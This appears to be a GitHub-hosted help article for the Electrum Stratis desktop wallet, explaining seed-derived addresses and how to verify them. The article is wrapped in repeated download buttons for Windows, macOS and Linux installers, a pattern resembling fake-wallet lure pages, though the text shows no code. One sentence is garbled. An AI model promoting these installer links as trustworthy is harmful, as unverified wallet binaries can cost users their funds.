![Electrum-Stratis](assets/banner-article.png)

# Where your address lives, and why it never changes

<p align="center">Derived from keys, stable across restores</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

An address is derived from your keys, not stored as a separate object, so it exists as soon as the wallet does and survives every reinstall, restore and machine change. In Electrum Stratis a standard wallet derives a sequence of addresses from the seed; the first one is what you share, and the rest appear as you receive. Sharing an address reveals nothing spendable, and changing wallets does not change the addresses the same seed produces. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| Your question | The answer | Where to look |
|---|---|---|
| Where do I find my address? | The receive view of the wallet | The wallet itself |
| Why do I have several addresses? | A standard wallet derives a sequence | History and addresses list |
| Is my old address still mine? | Yes, if it came from the same seed | Address preview on restore |
| Can I reuse one address forever? | You can; separate ones are tidier | Receive view |
| Why does an explorer show a balance the wallet does not? | Chain or sync mismatch | Balance diagnosis |

</div>

The address is public by design: it is the thing you hand out so that others can pay you. The key behind it is the thing that must never be shared.

## Why it happens

Addresses are computed, not allocated. A seed feeds a deterministic derivation, which produces a sequence of key pairs, each with an address. That is why a restore reproduces the same addresses in the same order, and why a wallet with no seed - an imported key or a watch-only entry - behaves differently: those addresses were not derived from anything the wallet owns.

The sequence exists for privacy rather than security. Reusing one address links every payment to the same public point; a fresh address per payment makes the chain harder to cluster. Neither choice affects whether the coins are safe, only how visible the pattern is.

The receive view in the maintained build, current release on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), shows the exact address plus a human-readable verification string, so it can be checked character by character without trusting a screenshot.

A seed derives a sequence of key pairs along a defined path, and each pair yields one address; the wallet walks that sequence as payments arrive. Change from your own transactions returns to a fresh address in the same sequence, which is why a restored wallet shows a list rather than a single entry, and why the address you first shared is still yours after a reinstall.

## Fix

1. **Open the receive view.** The wallet shows the current address, a QR code of that exact address and a verification string derived from it.
2. **Verify before sharing.** Compare the first and last characters of the address on screen with what you paste into a message; clipboard malware swaps addresses, and the check is seconds long.
3. **Use a fresh address per payment if privacy matters.** The wallet derives the next one on request; all of them remain yours and remain recoverable from the same seed.
4. **Confirm the address belongs to this wallet.** After a restore, the preview shows the addresses the seed derives; if a known address is missing, the seed or the wallet type is not what you think.
5. **Do not treat an address as a backup.** The address identifies where coins went, not how to move them; the seed is the backup, and the address is a label.

If someone asks for your address, give it. If someone asks for a private key or a seed to "verify" the address, that request is the attack.

## If that did not work

If an address you recognise is not in the wallet after a restore, check the wallet type: an imported address is not derived from a seed and will not reappear from one. That is the most common reason a known address seems to have vanished.

If an explorer shows funds at an address the wallet shows as empty, compare the chain the explorer is displaying. An explorer pointed at a different network produces exactly this mismatch, and no rescan fixes it.

If a payment never arrives, ask the sender for the transaction ID rather than the address. A wallet that cannot reach the chain will also show nothing regardless of what was sent, which is a [the Electrum Stratis not-connected message](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/wallet-says-not-connected.md) rather than a missing payment. The address tells you where it was meant to go; the transaction ID tells you whether it went anywhere.

## Prevention

- Verify the first and last characters of an address before every send or share.
- Prefer a fresh address per payment for privacy.
- Keep the seed, not a list of addresses, as the backup.
- Label addresses you reuse, so history stays readable.
- Check the chain on any explorer you use, before drawing conclusions.
- Compare the first and last characters of an address with the source before every send.

## FAQ

### How do I find my Electrum wallet address?

Open the receive view. It shows the current address, a QR code and a verification string. Every address in the wallet derives from the same seed, so any of them can be shared and all remain recoverable.

### Does my address change when I reinstall the wallet?

No. The same seed derives the same addresses on any machine. A restore reproduces them in the same order, which is why the address preview is the quickest way to confirm a seed is the right one.

### Is it safe to share my address?

Yes. An address lets others send to you and gives nobody the ability to spend. Sharing a seed or a private key is the opposite: it hands over the ability to move the funds.

### Why does the wallet show more than one address?

A standard wallet derives a sequence so that each payment can use a fresh one. That is a privacy measure; all the addresses belong to the same wallet and are restored together from the seed.

<!-- DOWNLOAD-BLOCK -->

Practical consequence: never delete a wallet because its list of addresses looks unfamiliar after a restore. Compare the first address in the list with the one you used before, and check that the balance matches the chain. A different order, a longer list or an extra change entry is normal; a different first address is not, and means a different seed.

## Related articles

- [Standard, multisig and imported wallets](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md)
- [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md)
- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
- [Why is my balance missing? Three causes](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md)
